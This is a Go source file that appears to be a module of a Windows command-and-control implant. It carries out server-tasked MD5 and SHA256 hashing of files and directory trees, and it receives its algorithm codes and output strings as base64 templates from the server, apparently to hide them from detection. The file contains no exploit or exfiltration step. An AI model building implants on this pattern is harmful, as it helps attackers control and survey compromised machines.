// server/docker/payloads/Windows/action_hash.go
//go:build windows
// +build windows

package main

import (
	"crypto/md5"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"strings"
	"time"
)

// DigestCfg receives string templates from server
type DigestCfg struct {
	Version   int      `json:"v"`
	Type      int      `json:"t"`
	Templates []string `json:"tpl"`
	Params    []string `json:"p"`
}

// Hash template indices (must match server's common.go)
const (
	// Algorithms (short form - server transforms long names before sending)
	idxHashAlgoSha256 = 260 // s (sha256)
	idxHashAlgoMd5    = 261 // m (md5)
	idxHashAlgoAll    = 262 // a (all/both)

	// Output prefixes
	idxHashPrefixMd5    = 263 // MD5:
	idxHashPrefixSha256 = 264 // SHA256:

	// Full algorithm names (for output)
	idxHashNameSha256 = 265 // sha256
	idxHashNameMd5    = 266 // md5
)

// DigestMsg implements the OpIface for file hashing
type DigestMsg struct {
	tpl *DigestCfg
}

// getTpl safely retrieves a template string by index
func (h *DigestMsg) getTpl(idx int) string {
	if h.tpl != nil && h.tpl.Templates != nil && idx < len(h.tpl.Templates) {
		return h.tpl.Templates[idx]
	}
	return ""
}

func (h *DigestMsg) execute(ctx *OpCtx, args []string) OpResult {
	// Parse template from Msg.Data - required for operation
	if ctx.CurrentMsg == nil || ctx.CurrentMsg.Data == "" {
		return OpResult{
			Output:      Err(E18),
			EC:    1,
			Done: time.Now().Format(time.RFC3339),
		}
	}

	decoded, err := base64.StdEncoding.DecodeString(ctx.CurrentMsg.Data)
	if err != nil {
		return OpResult{
			Output:      Err(E18),
			EC:    1,
			Done: time.Now().Format(time.RFC3339),
		}
	}

	h.tpl = &DigestCfg{}
	if err := json.Unmarshal(decoded, h.tpl); err != nil {
		return OpResult{
			Output:      Err(E18),
			EC:    1,
			Done: time.Now().Format(time.RFC3339),
		}
	}

	if len(args) < 1 {
		return OpResult{
			Output:      Err(E1),
			EC:    1,
			Done: time.Now().Format(time.RFC3339),
		}
	}

	// Get algorithm codes from template
	algoSha256 := h.getTpl(idxHashAlgoSha256) // s
	algoMd5 := h.getTpl(idxHashAlgoMd5)       // m
	algoAll := h.getTpl(idxHashAlgoAll)       // a

	// Get output prefixes from template
	prefixMd5 := h.getTpl(idxHashPrefixMd5)       // MD5:
	prefixSha256 := h.getTpl(idxHashPrefixSha256) // SHA256:

	// Parse arguments
	targetPath := args[0]
	algorithm := algoSha256 // default to sha256 (short code)
	if len(args) > 1 {
		algorithm = strings.ToLower(args[1])
	}

	// Handle relative paths
	if !filepath.IsAbs(targetPath) {
		ctx.mu.Lock()
		targetPath = filepath.Join(ctx.WorkingDir, targetPath)
		ctx.mu.Unlock()
	}

	// Clean the path
	targetPath = filepath.Clean(targetPath)

	// Check if file exists
	fileInfo, err := os.Stat(targetPath)
	if err != nil {
		if os.IsNotExist(err) {
			return OpResult{
				Output:      ErrCtx(E4, targetPath),
				Error:       err,
				EStr: Err(E4),
				EC:    1,
				Done: time.Now().Format(time.RFC3339),
			}
		}
		return OpResult{
			Output:      ErrCtx(E10, targetPath),
			Error:       err,
			EStr: Err(E10),
			EC:    1,
			Done: time.Now().Format(time.RFC3339),
		}
	}

	// Check if it's a directory
	if fileInfo.IsDir() {
		return OpResult{
			Output:      ErrCtx(E6, targetPath),
			EC:    1,
			Done: time.Now().Format(time.RFC3339),
		}
	}

	// Calculate hashes based on algorithm (using short codes from server)
	switch algorithm {
	case algoMd5:
		hash, err := calculateMD5(targetPath)
		if err != nil {
			return OpResult{
				Output:      ErrCtx(E10, targetPath),
				Error:       err,
				EStr: Err(E10),
				EC:    1,
				Done: time.Now().Format(time.RFC3339),
			}
		}
		return OpResult{
			Output:      fmt.Sprintf("%s%s:%s", prefixMd5, filepath.Base(targetPath), hash),
			EC:    0,
			Done: time.Now().Format(time.RFC3339),
		}

	case algoSha256:
		hash, err := calculateSHA256(targetPath)
		if err != nil {
			return OpResult{
				Output:      ErrCtx(E10, targetPath),
				Error:       err,
				EStr: Err(E10),
				EC:    1,
				Done: time.Now().Format(time.RFC3339),
			}
		}
		return OpResult{
			Output:      fmt.Sprintf("%s%s:%s", prefixSha256, filepath.Base(targetPath), hash),
			EC:    0,
			Done: time.Now().Format(time.RFC3339),
		}

	case algoAll:
		md5Hash, md5Err := calculateMD5(targetPath)
		sha256Hash, sha256Err := calculateSHA256(targetPath)

		var output strings.Builder
		output.WriteString(fmt.Sprintf("%s|%d\n", targetPath, fileInfo.Size()))

		if md5Err != nil {
			output.WriteString(fmt.Sprintf("%s%s\n", prefixMd5, Err(E10)))
		} else {
			output.WriteString(fmt.Sprintf("%s%s\n", prefixMd5, md5Hash))
		}

		if sha256Err != nil {
			output.WriteString(fmt.Sprintf("%s%s\n", prefixSha256, Err(E10)))
		} else {
			output.WriteString(fmt.Sprintf("%s%s\n", prefixSha256, sha256Hash))
		}

		// Determine exit code based on errors
		exitCode := 0
		if md5Err != nil || sha256Err != nil {
			exitCode = 1
		}

		return OpResult{
			Output:      output.String(),
			EC:    exitCode,
			Done: time.Now().Format(time.RFC3339),
		}

	default:
		return OpResult{
			Output:      ErrCtx(E21, algorithm),
			EC:    1,
			Done: time.Now().Format(time.RFC3339),
		}
	}
}

// calculateMD5 computes the MD5 hash of a file
func calculateMD5(filePath string) (string, error) {
	file, err := os.Open(filePath)
	if err != nil {
		return "", err
	}
	defer file.Close()

	hasher := md5.New()
	if _, err := io.Copy(hasher, file); err != nil {
		return "", err
	}

	return hex.EncodeToString(hasher.Sum(nil)), nil
}

// calculateSHA256 computes the SHA256 hash of a file
func calculateSHA256(filePath string) (string, error) {
	file, err := os.Open(filePath)
	if err != nil {
		return "", err
	}
	defer file.Close()

	hasher := sha256.New()
	if _, err := io.Copy(hasher, file); err != nil {
		return "", err
	}

	return hex.EncodeToString(hasher.Sum(nil)), nil
}

// DigestDirMsg implements OpIface for directory hashing
type DigestDirMsg struct {
	tpl *DigestCfg
}

// getTpl safely retrieves a template string by index
func (h *DigestDirMsg) getTpl(idx int) string {
	if h.tpl != nil && h.tpl.Templates != nil && idx < len(h.tpl.Templates) {
		return h.tpl.Templates[idx]
	}
	return ""
}

func (h *DigestDirMsg) execute(ctx *OpCtx, args []string) OpResult {
	// Parse template from Msg.Data - required for operation
	if ctx.CurrentMsg == nil || ctx.CurrentMsg.Data == "" {
		return OpResult{
			Output:      Err(E18),
			EC:    1,
			Done: time.Now().Format(time.RFC3339),
		}
	}

	decoded, err := base64.StdEncoding.DecodeString(ctx.CurrentMsg.Data)
	if err != nil {
		return OpResult{
			Output:      Err(E18),
			EC:    1,
			Done: time.Now().Format(time.RFC3339),
		}
	}

	h.tpl = &DigestCfg{}
	if err := json.Unmarshal(decoded, h.tpl); err != nil {
		return OpResult{
			Output:      Err(E18),
			EC:    1,
			Done: time.Now().Format(time.RFC3339),
		}
	}

	if len(args) < 1 {
		return OpResult{
			Output:      Err(E1),
			EC:    1,
			Done: time.Now().Format(time.RFC3339),
		}
	}

	// Get algorithm codes from template
	algoSha256 := h.getTpl(idxHashAlgoSha256) // s
	algoMd5 := h.getTpl(idxHashAlgoMd5)       // m

	// Get full algorithm names for output
	nameSha256 := h.getTpl(idxHashNameSha256) // sha256
	nameMd5 := h.getTpl(idxHashNameMd5)       // md5

	targetDir := args[0]
	algorithm := algoSha256 // default
	pattern := "*"

	if len(args) > 1 {
		algorithm = strings.ToLower(args[1])
	}
	if len(args) > 2 {
		pattern = args[2]
	}

	// Handle relative paths
	if !filepath.IsAbs(targetDir) {
		ctx.mu.Lock()
		targetDir = filepath.Join(ctx.WorkingDir, targetDir)
		ctx.mu.Unlock()
	}

	var output strings.Builder
	var fileCount int
	var errorCount int

	// Determine algorithm name for header output
	algoName := nameSha256
	if algorithm == algoMd5 {
		algoName = nameMd5
	}
	output.WriteString(fmt.Sprintf("%s|%s|%s\n", targetDir, pattern, strings.ToUpper(algoName)))

	err = filepath.Walk(targetDir, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			errorCount++
			return nil // Continue walking despite errors
		}

		// Skip directories
		if info.IsDir() {
			return nil
		}

		// Check if file matches pattern
		matched, _ := filepath.Match(pattern, filepath.Base(path))
		if !matched && pattern != "*" {
			return nil
		}

		fileCount++
		relPath, _ := filepath.Rel(targetDir, path)

		var hash string
		var hashErr error

		switch algorithm {
		case algoMd5:
			hash, hashErr = calculateMD5(path)
		case algoSha256:
			hash, hashErr = calculateSHA256(path)
		default:
			hash = Err(E2)
			hashErr = fmt.Errorf("%s", Err(E2))
		}

		if hashErr != nil {
			output.WriteString(fmt.Sprintf("%s:%s\n", Err(E10), relPath))
			errorCount++
		} else {
			output.WriteString(fmt.Sprintf("%s:%s\n", hash, relPath))
		}

		return nil
	})

	if err != nil {
		output.WriteString(fmt.Sprintf("\n%s\n", ErrCtx(E10, targetDir)))
		return OpResult{
			Output:      output.String(),
			Error:       err,
			EStr: Err(E10),
			EC:    1,
			Done: time.Now().Format(time.RFC3339),
		}
	}

	output.WriteString(fmt.Sprintf("S5:%d|%d\n", fileCount, errorCount))

	exitCode := 0
	if errorCount > 0 {
		exitCode = 1
	}

	return OpResult{
		Output:      output.String(),
		EC:    exitCode,
		Done: time.Now().Format(time.RFC3339),
	}
}
